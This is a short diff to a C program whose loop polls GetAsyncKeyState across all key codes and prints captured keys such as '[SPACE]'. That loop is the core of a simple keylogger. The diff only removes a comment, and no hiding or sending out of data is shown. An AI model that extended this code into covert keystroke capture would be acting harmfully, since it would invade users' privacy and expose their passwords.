@@ -5,7 +5,7 @@
 int main() {
     while (1) {
         for (int key = 8; key <= 255; ++key) {
-            if (GetAsyncKeyState(key) & 0x8000) {  // Check if key is pressed
+            if (GetAsyncKeyState(key) & 0x8000) {  
                 if (key == VK_SPACE) {
                     printf("[SPACE]");
                 }
